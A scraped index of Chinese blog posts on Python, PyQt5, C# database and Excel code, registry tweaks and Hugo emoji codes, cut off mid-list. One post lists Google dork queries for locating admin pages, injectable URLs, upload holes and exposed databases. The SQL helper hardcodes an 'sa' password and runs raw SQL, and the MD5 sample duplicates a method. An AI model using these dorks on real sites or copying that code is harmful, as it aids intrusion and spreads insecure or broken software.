cffi==1.14.0 chardet==3.0.4 fire==0.2.1 gevent==1.4.0 greenlet==0.4.15 idna==2.8 lxml==4.5.0 Pillow==7.1.1 pycparser==2.20 requests==2.22.0 six==1.14.0 soupsieve==2.0 termcolor==1.1.0 tqdm==4.34.0 urllib3==1.25.3 安装命令 pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/ 其它pypi源 #阿里云 http://mirrors.aliyun.com/pypi/simple/ #中国科学技术大学 http://pypi.mirrors.ustc.edu.cn/simple/ #清华大学 https://pypi.tuna.tsinghua.edu.cn/simple/ ","permalink":"https://examplesite.com/posts/20160601/","summary":"","title":"Python批量安装依赖"},{"content":"main.py # -*- coding: utf-8 -*- import sys import time from PyQt5.QtCore import QThread, pyqtSignal from PyQt5.QtWidgets import QApplication, QMainWindow from UI import Ui_Form class MyMainForm(QMainWindow, Ui_Form): def __init__(self, parent=None): super(MyMainForm, self).__init__(parent) self.setupUi(self) # 实例化线程对象 self.work = WorkThread() self.runButton.clicked.connect(self.execute) def execute(self): # 启动线程 self.work.start() # 线程自定义信号连接的槽函数 self.work.trigger.connect(self.display) def display(self, str): # 由于自定义信号时自动传递一个字符串参数，所以在这个槽函数中要接受一个参数 self.listWidget.addItem(str) class WorkThread(QThread): # 自定义信号对象。参数str就代表这个信号可以传一个字符串 trigger = pyqtSignal(str) def __int__(self): # 初始化函数 super(WorkThread, self).__init__() def run(self): # 重写线程执行的run函数 # 触发自定义信号 for i in range(20): time.sleep(1) # 通过自定义信号把待显示的字符串传递给槽函数 self.trigger.emit(str(i)) if __name__ == \u0026#34;__main__\u0026#34;: app = QApplication(sys.argv) myWin = MyMainForm() myWin.show() sys.exit(app.exec_()) UI.py # -*- coding: utf-8 -*- # Form implementation generated from reading ui file \u0026#39;UI.ui\u0026#39; # # Created by: PyQt5 UI code generator 5.13.0 # # WARNING! All changes made in this file will be lost! from PyQt5 import QtCore, QtGui, QtWidgets class Ui_Form(object): def setupUi(self, Form): Form.setObjectName(\u0026#34;Form\u0026#34;) Form.resize(498, 331) self.runButton = QtWidgets.QPushButton(Form) self.runButton.setGeometry(QtCore.QRect(190, 30, 75, 23)) self.runButton.setObjectName(\u0026#34;runButton\u0026#34;) self.listWidget = QtWidgets.QListWidget(Form) self.listWidget.setGeometry(QtCore.QRect(30, 70, 431, 192)) self.listWidget.setObjectName(\u0026#34;listWidget\u0026#34;) self.retranslateUi(Form) QtCore.QMetaObject.connectSlotsByName(Form) def retranslateUi(self, Form): _translate = QtCore.QCoreApplication.translate Form.setWindowTitle(_translate(\u0026#34;Form\u0026#34;, \u0026#34;Qthread Example\u0026#34;)) self.runButton.setText(_translate(\u0026#34;Form\u0026#34;, \u0026#34;Run\u0026#34;)) UI.ui \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;ui version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;class\u0026gt;Form\u0026lt;/class\u0026gt; \u0026lt;widget class=\u0026#34;QWidget\u0026#34; name=\u0026#34;Form\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;geometry\u0026#34;\u0026gt; \u0026lt;rect\u0026gt; \u0026lt;x\u0026gt;0\u0026lt;/x\u0026gt; \u0026lt;y\u0026gt;0\u0026lt;/y\u0026gt; \u0026lt;width\u0026gt;498\u0026lt;/width\u0026gt; \u0026lt;height\u0026gt;331\u0026lt;/height\u0026gt; \u0026lt;/rect\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;property name=\u0026#34;windowTitle\u0026#34;\u0026gt; \u0026lt;string\u0026gt;Qthread Example\u0026lt;/string\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;widget class=\u0026#34;QPushButton\u0026#34; name=\u0026#34;runButton\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;geometry\u0026#34;\u0026gt; \u0026lt;rect\u0026gt; \u0026lt;x\u0026gt;190\u0026lt;/x\u0026gt; \u0026lt;y\u0026gt;30\u0026lt;/y\u0026gt; \u0026lt;width\u0026gt;75\u0026lt;/width\u0026gt; \u0026lt;height\u0026gt;23\u0026lt;/height\u0026gt; \u0026lt;/rect\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;property name=\u0026#34;text\u0026#34;\u0026gt; \u0026lt;string\u0026gt;Run\u0026lt;/string\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;/widget\u0026gt; \u0026lt;widget class=\u0026#34;QListWidget\u0026#34; name=\u0026#34;listWidget\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;geometry\u0026#34;\u0026gt; \u0026lt;rect\u0026gt; \u0026lt;x\u0026gt;30\u0026lt;/x\u0026gt; \u0026lt;y\u0026gt;70\u0026lt;/y\u0026gt; \u0026lt;width\u0026gt;431\u0026lt;/width\u0026gt; \u0026lt;height\u0026gt;192\u0026lt;/height\u0026gt; \u0026lt;/rect\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;/widget\u0026gt; \u0026lt;/widget\u0026gt; \u0026lt;resources/\u0026gt; \u0026lt;connections/\u0026gt; \u0026lt;/ui\u0026gt; ","permalink":"https://examplesite.com/posts/20160501/","summary":"","title":"PyQt5多线程模块QThread使用方法"},{"content":"引入  使用这个方法需要装有微软office\n  引入程序集: Microsoft.Office.Interop.Excel.dll 没有就网上下载一份然后引用即可  实现方法 private void ExportExcels(string fileName, DataGridView myDGV) { string saveFileName = \u0026#34;\u0026#34;; SaveFileDialog saveDialog = new SaveFileDialog(); saveDialog.DefaultExt = \u0026#34;xls\u0026#34;; saveDialog.Filter = \u0026#34;Excel文件|*.xls\u0026#34;; saveDialog.FileName = fileName; saveDialog.ShowDialog(); saveFileName = saveDialog.FileName; if (saveFileName.IndexOf(\u0026#34;:\u0026#34;) \u0026lt; 0) return; //被点了取消  Microsoft.Office.Interop.Excel.Application xlApp = new Microsoft.Office.Interop.Excel.Application(); if (xlApp == null) { MessageBox.Show(\u0026#34;无法创建Excel对象，可能您的机子未安装Excel\u0026#34;); return; } Microsoft.Office.Interop.Excel.Workbooks workbooks = xlApp.Workbooks; Microsoft.Office.Interop.Excel.Workbook workbook = workbooks.Add(Microsoft.Office.Interop.Excel.XlWBATemplate.xlWBATWorksheet); Microsoft.Office.Interop.Excel.Worksheet worksheet = (Microsoft.Office.Interop.Excel.Worksheet)workbook.Worksheets[1];//取得sheet1  //写入标题  for (int i = 0; i \u0026lt; myDGV.ColumnCount; i++) { worksheet.Cells[1, i + 1] = myDGV.Columns[i].HeaderText; } //写入数值  for (int r = 0; r \u0026lt; myDGV.Rows.Count; r++) { for (int i = 0; i \u0026lt; myDGV.ColumnCount; i++) { worksheet.Cells[r + 2, i + 1] = myDGV.Rows[r].Cells[i].Value; } System.Windows.Forms.Application.DoEvents(); } worksheet.Columns.EntireColumn.AutoFit();//列宽自适应  if (saveFileName != \u0026#34;\u0026#34;) { try { workbook.Saved = true; workbook.SaveCopyAs(saveFileName); } catch (Exception ex) { MessageBox.Show(\u0026#34;导出文件时出错,文件可能正被打开！\\n\u0026#34; + ex.Message); } } xlApp.Quit(); GC.Collect(); //强行销毁  MessageBox.Show(\u0026#34;文件： \u0026#34; + fileName + \u0026#34;.xls 保存成功\u0026#34;, \u0026#34;信息提示\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Information); } 点击按钮调用 private void button1_Click(object sender, EventArgs e) { string a = \u0026#34;D:\u0026#34; + \u0026#34;\\\\KKHMD.xls\u0026#34;; ExportExcels(a, dataGridView1); } ","permalink":"https://examplesite.com/posts/20160401/","summary":"","title":"C# winform中DataGridView的数据实现导出excel"},{"content":"环境 VS2010 + SqlServer 2008\n首先，按照面向对象的程序设计思想，设计一个数据库操作工具类MyTool.cs，该类中封装了关于数据库连接和操作的方法，各个功能模块在需进行数据库操作时只需调用相应的函数\n//引入的命名空间 using System.Data.SqlClient; //用于SQL Sever数据访问的命名空间 using System.Data; //DataSet类的命名空间 using System.Windows.Forms; //DataGridView控件类的命名空间  //执行指定的SQL命令语句(insert,delete,update等),并返回命令所影响的行数 public static int executeCommand(string sqlStr) { SqlConnection sqlConnection1 = new SqlConnection(\u0026#34;server=dell-PC;database=11071312HotelSys;uid=sa;pwd=xiaoyi9421\u0026#34;);//创建数据库连接(字符串中是我个人的数据库信息)  sqlConnection1.Open(); //打开数据库连接  SqlCommand sqlCommand1 = new SqlCommand(sqlStr, sqlConnection1); //执行SQL命令  int Succnum = sqlCommand1.ExecuteNonQuery(); return Succnum; } //查询(select)指定的数据记录（多行多列）,并填充到数据控件DataGridView中 public static void queryDataToGrid(string sqlStr, DataGridView dataGridView1) { SqlConnection sqlConnection1 = new SqlConnection(\u0026#34;server=dell-PC;database=11071312HotelSys;uid=sa;pwd=xiaoyi9421\u0026#34;);//创建数据库连接  SqlDataAdapter sqlDataAdapter1 = new SqlDataAdapter(sqlStr, sqlConnection1);//利用已创建好的sqlConnection1,创建数据适配器sqlDataAdapter1  DataSet dataSet1 = new DataSet(); //创建数据集对象  sqlDataAdapter1.Fill(dataSet1); //执行查询,查询的结果存放在数据集里  dataGridView1.DataSource = dataSet1.Tables[0]; //把数据集中的查询结果绑定到dataGridView1中 } //查询(select)指定的数据（单个数据,假设为string类型）,并返回 public static string queryData(string sqlStr) { SqlConnection sqlConnection1 = new SqlConnection(\u0026#34;server=dell-PC;database=11071312HotelSys;uid=sa;pwd=xiaoyi9421\u0026#34;);//创建数据库连接  SqlDataAdapter sqlDataAdapter1 = new SqlDataAdapter(sqlStr, sqlConnection1);//利用已创建好的sqlConnection1,创建数据适配器sqlDataAdapter1  DataSet dataSet1 = new DataSet(); //创建数据集对象  sqlDataAdapter1.Fill(dataSet1); //执行查询,查询的结果存放在数据集里  return dataSet1.Tables[0].Rows[0][\u0026#34;列名\u0026#34;].ToString(); //把查询结果的第一行指定列下的数据以string类型返回 } 当在各个功能模块中需要进行数据库操作时，只需指定要执行的SQL语句，调用一下数据库工具类中的方法即可实现，下面给了一些基本的的SQL操作(单表)\n//增 sqlStr = \u0026#34;insert into 表名( 列名1 , 列名2 )values( 插入值1 , 插入值2 )\u0026#34;; //执行指定的SQL命令语句,并返回命令所影响的行数 int Succnum = MyTool.executeCommand(sqlStr); if (Succnum \u0026gt; 0) MessageBox.Show(\u0026#34;录入成功\u0026#34;); //删 sqlStr = \u0026#34;delete from 表名 where 删除条件\u0026#34;; int Succnum = MyTool.executeCommand(sqlStr); if (Succnum \u0026gt; 0) MessageBox.Show(\u0026#34;删除成功\u0026#34;); //改 sqlStr = \u0026#34;update 表名 set 列名1 = 更新值1 , 列名2 = 更新值2\u0026#34;; int Succnum = MyTool.executeCommand(sqlStr); if (Succnum \u0026gt; 0) MessageBox.Show(\u0026#34;更新成功\u0026#34;); //查一组数据 sqlStr = \u0026#34;select 列名1 , 列名2 from 表名 where 查询表达式\u0026#34;; MyTool.queryDataToGrid(sqlStr, dataGridView1);//填充到数据控件DataGridView中  //查单个数据 sqlStr = \u0026#34;select 列名 from 表名 where 查询表达式\u0026#34;; textBox1.Text = MyTool.queryData(sqlStr); //填充到文本框textBox1中 ","permalink":"https://examplesite.com/posts/20160301/","summary":"","title":"C# 连SqlServer数据库"},{"content":"MD5加密 using System; using System.Collections.Generic; using System.Text; using System.Security.Cryptography; namespace md5 { class Program { static void Main(string[] args) { Console.WriteLine(UserMd5(\u0026#34;8\u0026#34;)); Console.WriteLine(GetMd5Str(\u0026#34;8\u0026#34;)); } // MD5 16位加密 加密后密码为大写  public static string GetMd5Str(string ConvertString) { MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider(); string t2 = BitConverter.ToString(md5.ComputeHash(UTF8Encoding.Default.GetBytes(ConvertString)), 4, 8); t2 = t2.Replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;); return t2; } // MD5 16位加密 加密后密码为小写  public static string GetMd5Str(string ConvertString) { MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider(); string t2 = BitConverter.ToString(md5.ComputeHash(UTF8Encoding.Default.GetBytes(ConvertString)), 4, 8); t2 = t2.Replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;); t2 = t2.ToLower(); return t2; } // MD5　32位加密  static string UserMd5(string str) { string cl = str; string pwd = \u0026#34;\u0026#34;; MD5 md5 = MD5.Create();//实例化一个md5对像  // 加密后是一个字节类型的数组，这里要注意编码UTF8/Unicode等的选择　 byte[] s = md5.ComputeHash(Encoding.UTF8.GetBytes(cl)); // 通过使用循环，将字节类型的数组转换为字符串，此字符串是常规字符格式化所得  for (int i = 0; i \u0026lt; s.Length; i++) { // 将得到的字符串使用十六进制类型格式。格式后的字符是小写的字母，如果使用大写（X）则格式后的字符是大写字符  pwd = pwd + s[i].ToString(\u0026#34;X\u0026#34;); } return pwd; } } } using System.Security.Cryptography; using System.Text; public static string StringToMD5Hash(string inputString) { MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider(); byte[] encryptedBytes = md5.ComputeHash(Encoding.ASCII.GetBytes(inputString)); StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; encryptedBytes.Length; i++) { sb.AppendFormat(\u0026#34;{0:x2}\u0026#34;, encryptedBytes[i]); } return sb.ToString(); } ","permalink":"https://examplesite.com/posts/20160201/","summary":"","title":"C# MD5加密"},{"content":"WINFORM 打开新窗体 关闭当前窗体 Form1 的 Button 下 { Form2 f2 = new Form2(); f2.ShowDialog(this);//  this.Close(); } Form2 的 load 下 { //只能隐藏不能关闭  this.owner.hide(); } ","permalink":"https://examplesite.com/posts/20160101/","summary":"","title":"C# WINFORM 打开新窗体 关闭当前窗体"},{"content":"  site：可以限制你搜索范围的域名. inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用. intext: 只搜索网页部分中包含的文字(也就是忽略了标题、URL等的文字) intitle: 查包含关键词的页面，一般用于社工别人的webshell密码 filetype：搜索文件的后缀或者扩展名 intitle：限制你搜索的网页标题. link: 可以得到一个所有包含了某个指定URL的页面列表.    查找后台地址：site域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms 查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username 查找可注入点：site:域名 inurl:aspx|jsp|php|asp 查找上传漏洞：site:域名 inurl:file|load|editor|Files 找eweb编辑器：site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit 存在的数据库：site:域名 filetype:mdb|asp|# 查看脚本类型：site:域名 filetype:asp/aspx/php/jsp 迂回策略入侵：inurl:cms/data/templates/images/index/ ","permalink":"https://examplesite.com/posts/20151201/","summary":"","title":"高级搜索语法"},{"content":" 请在【此电脑】最上方【查看】中勾选【文件扩展名】\n 使用reg文件添加  复制下面的代码把后缀改成 .reg Windows Registry Editor Version 5.00 [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer] \u0026#34;link\u0026#34;=hex:00,00,00,00 ","permalink":"https://examplesite.com/posts/20151101/","summary":"","title":"Win10创建快捷方式时去掉快捷方式后缀"},{"content":" 请在【此电脑】最上方【查看】中勾选【文件扩展名】\n 使用reg文件添加  复制下面的代码把后缀改成 .reg Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations] \u0026#34;.ico\u0026#34;=\u0026#34;PhotoViewer.FileAssoc.Tiff\u0026#34; \u0026#34;.png\u0026#34;=\u0026#34;PhotoViewer.FileAssoc.Tiff\u0026#34; \u0026#34;.gif\u0026#34;=\u0026#34;PhotoViewer.FileAssoc.Tiff\u0026#34; \u0026#34;.jpg\u0026#34;=\u0026#34;PhotoViewer.FileAssoc.Tiff\u0026#34; \u0026#34;.jpeg\u0026#34;=\u0026#34;PhotoViewer.FileAssoc.Tiff\u0026#34; \u0026#34;.bmp\u0026#34;=\u0026#34;PhotoViewer.FileAssoc.Tiff\u0026#34; \u0026#34;.ico\u0026#34;=\u0026#34;PhotoViewer.FileAssoc.Tiff\u0026#34; \u0026#34;.svg\u0026#34;=\u0026#34;PhotoViewer.FileAssoc.Tiff\u0026#34; \u0026#34;.webp\u0026#34;=\u0026#34;PhotoViewer.FileAssoc.Tiff\u0026#34; \u0026#34;.tif\u0026#34;=\u0026#34;PhotoViewer.FileAssoc.Tiff\u0026#34; \u0026#34;.tiff\u0026#34;=\u0026#34;PhotoViewer.FileAssoc.Tiff\u0026#34; 使用bat添加 这个方法需要管理员权限运行，比较推荐使用第一个方法\n 复制下面的代码把后缀改成 .bat @echo off\u0026amp;cd\\\u0026amp;color 0a\u0026amp;cls echo 如果显示【错误 拒绝访问】请右键选择【以管理员身份运行】 echo ------------------------------------------------------------ reg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\u0026#34; /v \u0026#34;.ico\u0026#34; /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\u0026#34; /v \u0026#34;.png\u0026#34; /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\u0026#34; /v \u0026#34;.gif\u0026#34; /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\u0026#34; /v \u0026#34;.jpg\u0026#34; /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\u0026#34; /v \u0026#34;.jpeg\u0026#34; /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\u0026#34; /v \u0026#34;.bmp\u0026#34; /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\u0026#34; /v \u0026#34;.ico\u0026#34; /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\u0026#34; /v \u0026#34;.svg\u0026#34; /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\u0026#34; /v \u0026#34;.webp\u0026#34; /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\u0026#34; /v \u0026#34;.tif\u0026#34; /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\u0026#34; /v \u0026#34;.tiff\u0026#34; /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f echo ------------------------------------------------------------ echo 右键选择【打开方式】然后选择【照片查看器】即可 echo; pause ","permalink":"https://examplesite.com/posts/20151001/","summary":"","title":"Win10使用Windows照片查看打开图片"},{"content":"Emoji 支持 Emoji 可以通过多种方式在 Hugo 项目中启用.\nemojify 方法可以直接在模板中调用, 或者使用行内 Shortcodes.\n要全局使用 emoji, 需要在你的网站配置中设置 enableEmoji 为 true, 然后你就可以直接在文章中输入 emoji 的代码.\n它们以冒号开头和结尾，并且包含 emoji 的 代码:\n去露营啦! {?:}tent: 很快就回来. 真开心! {?:}joy: 呈现的输出效果如下:\n去露营啦! :tent: 很快就回来.\n真开心! :joy:\n以下符号清单是 emoji 代码的非常有用的参考.\n表情与情感 笑脸表情    图标 代码 图标 代码     :grinning: grinning :smiley: smiley   :smile: smile :grin: grin   :laughing: laughing satisfied :sweat_smile: sweat_smile   :rofl: rofl :joy: joy   :slightly_smiling_face: slightly_smiling_face :upside_down_face: upside_down_face   :wink: wink :blush: blush   :innocent: innocent      爱意表情    图标 代码 图标 代码     :heart_eyes: heart_eyes :kissing_heart: kissing_heart   :kissing: kissing :relaxed: relaxed   :kissing_closed_eyes: kissing_closed_eyes :kissing_smiling_eyes: kissing_smiling_eyes    吐舌头表情    图标 代码 图标 代码     :yum: yum :stuck_out_tongue: stuck_out_tongue   :stuck_out_tongue_winking_eye: stuck_out_tongue_winking_eye :stuck_out_tongue_closed_eyes: stuck_out_tongue_closed_eyes   :money_mouth_face: money_mouth_face      带手的表情    图标 代码 图标 代码     :hugs: hugs :thinking: thinking    中性表情    图标 代码 图标 代码     :zipper_mouth_face: zipper_mouth_face :neutral_face: neutral_face   :expressionless: expressionless :no_mouth: no_mouth   :smirk: smirk :unamused: unamused   :roll_eyes: roll_eyes :grimacing: grimacing   :lying_face: lying_face      困倦的表情    图标 代码 图标 代码     :relieved: relieved :pensive: pensive   :sleepy: sleepy :drooling_face: drooling_face   :sleeping: sleeping      不适的表情    图标 代码 图标 代码     :mask: mask :face_with_thermometer: face_with_thermometer   :face_with_head_bandage: face_with_head_bandage :nauseated_face: nauseated_face   :sneezing_face: sneezing_face :dizzy_face: dizzy_face    戴帽子的表情    图标 代码 图标 代码     :cowboy_hat_face: cowboy_hat_face      戴眼镜的表情    图标 代码 图标 代码     :sunglasses: sunglasses :nerd_face: nerd_face    担心的表情    图标 代码 图标 代码     :confused: confused :worried: worried   :slightly_frowning_face: slightly_frowning_face :frowning_face: frowning_face   :open_mouth: open_mouth :hushed: hushed   :astonished: astonished :flushed: flushed   :frowning: frowning :anguished: anguished   :fearful: fearful :cold_sweat: cold_sweat   :disappointed_relieved: disappointed_relieved :cry: cry   :sob: sob :scream: scream   :confounded: confounded :persevere: persevere   :disappointed: disappointed :sweat: sweat   :weary: weary :tired_face: tired_face    否定的表情    图标 代码 图标 代码     :triumph: triumph :pout: pout rage   :angry: angry :smiling_imp: smiling_imp   :imp: imp :skull: skull   :skull_and_crossbones: skull_and_crossbones      特殊打扮的表情    图标 代码 图标 代码     :hankey: hankey poop shit :clown_face: clown_face   :japanese_ogre: japanese_ogre :japanese_goblin: japanese_goblin   :ghost: ghost :alien: alien   :space_invader: space_invader :robot: robot    猫脸表情    图标 代码 图标 代码     :smiley_cat: smiley_cat :smile_cat: smile_cat   :joy_cat: joy_cat :heart_eyes_cat: heart_eyes_cat   :smirk_cat: smirk_cat :kissing_cat: kissing_cat   :scream_cat: scream_cat :crying_cat_face: crying_cat_face   :pouting_cat: pouting_cat      猴脸表情    图标 代码 图标 代码     :see_no_evil: see_no_evil :hear_no_evil: hear_no_evil   :speak_no_evil: speak_no_evil      情感    图标 代码 图标 代码     :kiss: kiss :love_letter: love_letter   :cupid: cupid :gift_heart: gift_heart   :sparkling_heart: sparkling_heart :heartpulse: heartpulse   :heartbeat: heartbeat :revolving_hearts: revolving_hearts   :two_hearts: two_hearts :heart_decoration: heart_decoration   :heavy_heart_exclamation: heavy_heart_exclamation :broken_heart: broken_heart   :heart: heart :yellow_heart: yellow_heart   :green_heart: green_heart :blue_heart: blue_heart   :purple_heart: purple_heart :black_heart: black_heart   :100: 100 :anger: anger   :boom: boom collision :dizzy: dizzy   :sweat_drops: sweat_drops :dash: dash   :hole: hole :bomb: bomb   :speech_balloon: speech_balloon :eye_speech_bubble: eye_speech_bubble   :right_anger_bubble: right_anger_bubble :thought_balloon: thought_balloon   :zzz: zzz      人与身体 张开手掌的手势    图标 代码 图标 代码     :wave: wave :raised_back_of_hand: raised_back_of_hand   :raised_hand_with_fingers_splayed: raised_hand_with_fingers_splayed :hand: hand raised_hand   :vulcan_salute: vulcan_salute      部分手指的手势    图标 代码 图标 代码     :ok_hand: ok_hand :v: v   :crossed_fingers: crossed_fingers :metal: metal   :call_me_hand: call_me_hand      一根手指的手势    图标 代码 图标 代码     :point_left: point_left :point_right: point_right   :point_up_2: point_up_2 :fu: fu middle_finger   :point_down: point_down :point_up: point_up    握紧的手势    图标 代码 图标 代码     :+1: +1 thumbsup :-1: -1 thumbsdown   :fist: fist fist_raised :facepunch: facepunch fist_oncoming punch   :fist_left: fist_left :fist_right: fist_right    两只手    图标 代码 图标 代码     :clap: clap :raised_hands: raised_hands   :open_hands: open_hands :handshake: handshake   :pray: pray      握住东西的手势    图标 代码 图标 代码     :writing_hand: writing_hand :nail_care: nail_care   :selfie: selfie      身体部位    图标 代码 图标 代码     :muscle: muscle :ear: ear   :nose: nose :eyes: eyes   :eye: eye :tongue: tongue   :lips: lips      人    图标 代码 图标 代码     :baby: baby :boy: boy   :girl: girl :blonde_man: blonde_man person_with_blond_hair   :man: man :woman: woman   :blonde_woman: blonde_woman :older_man: older_man   :older_woman: older_woman      身体动作    图标 代码 图标 代码     :frowning_woman: frowning_woman person_frowning :frowning_man: frowning_man   :person_with_pouting_face: person_with_pouting_face pouting_woman :pouting_man: pouting_man   :ng_woman: ng_woman no_good no_good_woman :ng_man: ng_man no_good_man   :ok_woman: ok_woman :ok_man: ok_man   :information_desk_person: information_desk_person sassy_woman tipping_hand_woman :sassy_man: sassy_man tipping_hand_man   :raising_hand: raising_hand raising_hand_woman :raising_hand_man: raising_hand_man   :bow: bow bowing_man :bowing_woman: bowing_woman   :man_facepalming: man_facepalming :woman_facepalming: woman_facepalming   :man_shrugging: man_shrugging :woman_shrugging: woman_shrugging    人物角色    图标 代码 图标 代码     :man_health_worker: man_health_worker :woman_health_worker: woman_health_worker   :man_student: man_student :woman_student: woman_student   :man_teacher: man_teacher :woman_teacher: woman_teacher   :man_judge: man_judge :woman_judge: woman_judge   :man_farmer: man_farmer :woman_farmer: woman_farmer   :man_cook: man_cook :woman_cook: woman_cook   :man_mechanic: man_mechanic :woman_mechanic: woman_mechanic   :man_factory_worker: man_factory_worker :woman_factory_worker: woman_factory_worker   :man_office_worker: man_office_worker :woman_office_worker: woman_office_worker   :man_scientist: man_scientist :woman_scientist: woman_scientist   :man_technologist: man_technologist :woman_technologist: woman_technologist   :man_singer: man_singer :woman_singer: woman_singer   :man_artist: man_artist :woman_artist: woman_artist   :man_pilot: man_pilot :woman_pilot: woman_pilot   :man_astronaut: man_astronaut :woman_astronaut: woman_astronaut   :man_firefighter: man_firefighter :woman_firefighter: woman_firefighter   :cop: cop policeman :policewoman: policewoman   :detective: detective male_detective :female_detective: female_detective   :guardsman: guardsman :guardswoman: guardswoman   :construction_worker: construction_worker construction_worker_man :construction_worker_woman: construction_worker_woman   :prince: prince :princess: princess   :man_with_turban: man_with_turban :woman_with_turban: woman_with_turban   :man_with_gua_pi_mao: man_with_gua_pi_mao :man_in_tuxedo: man_in_tuxedo   :bride_with_veil: bride_with_veil :pregnant_woman: pregnant_woman    幻想的人物    图标 代码 图标 代码     :angel: angel :santa: santa   :mrs_claus: mrs_claus      人物活动    图标 代码 图标 代码     :massage: massage massage_woman :massage_man: massage_man   :haircut: haircut haircut_woman :haircut_man: haircut_man   :walking: walking walking_man :walking_woman: walking_woman   :runner: runner running running_man :running_woman: running_woman   :dancer: dancer :man_dancing: man_dancing   :business_suit_levitating: business_suit_levitating :dancers: dancers dancing_women   :dancing_men: dancing_men      体育    图标 代码 图标 代码     :person_fencing: person_fencing :horse_racing: horse_racing   :skier: skier :snowboarder: snowboarder   :golfing_man: golfing_man :golfing_woman: golfing_woman   :surfer: surfer surfing_man :surfing_woman: surfing_woman   :rowboat: rowboat rowing_man :rowing_woman: rowing_woman   :swimmer: swimmer swimming_man :swimming_woman: swimming_woman   :basketball_man: basketball_man :basketball_woman: basketball_woman   :weight_lifting_man: weight_lifting_man :weight_lifting_woman: weight_lifting_woman   :bicyclist: bicyclist biking_man :biking_woman: biking_woman   :mountain_bicyclist: mountain_bicyclist mountain_biking_man :mountain_biking_woman: mountain_biking_woman   :man_cartwheeling: man_cartwheeling :woman_cartwheeling: woman_cartwheeling   :men_wrestling: men_wrestling :women_wrestling: women_wrestling   :man_playing_water_polo: man_playing_water_polo :woman_playing_water_polo: woman_playing_water_polo   :man_playing_handball: man_playing_handball :woman_playing_handball: woman_playing_handball   :man_juggling: man_juggling :woman_juggling: woman_juggling    休息    图标 代码 图标 代码     :bath: bath :sleeping_bed: sleeping_bed    家庭    图标 代码 图标 代码     :two_women_holding_hands: two_women_holding_hands :couple: couple   :two_men_holding_hands: two_men_holding_hands :couplekiss_man_woman: couplekiss_man_woman   :couplekiss_man_man: couplekiss_man_man :couplekiss_woman_woman: couplekiss_woman_woman   :couple_with_heart: couple_with_heart couple_with_heart_woman_man :couple_with_heart_man_man: couple_with_heart_man_man   :couple_with_heart_woman_woman: couple_with_heart_woman_woman :family: family family_man_woman_boy   :family_man_woman_girl: family_man_woman_girl :family_man_woman_girl_boy: family_man_woman_girl_boy   :family_man_woman_boy_boy: family_man_woman_boy_boy :family_man_woman_girl_girl: family_man_woman_girl_girl   :family_man_man_boy: family_man_man_boy :family_man_man_girl: family_man_man_girl   :family_man_man_girl_boy: family_man_man_girl_boy :family_man_man_boy_boy: family_man_man_boy_boy   :family_man_man_girl_girl: family_man_man_girl_girl :family_woman_woman_boy: family_woman_woman_boy   :family_woman_woman_girl: family_woman_woman_girl :family_woman_woman_girl_boy: family_woman_woman_girl_boy   :family_woman_woman_boy_boy: family_woman_woman_boy_boy :family_woman_woman_girl_girl: family_woman_woman_girl_girl   :family_man_boy: family_man_boy :family_man_boy_boy: family_man_boy_boy   :family_man_girl: family_man_girl :family_man_girl_boy: family_man_girl_boy   :family_man_girl_girl: family_man_girl_girl :family_woman_boy: 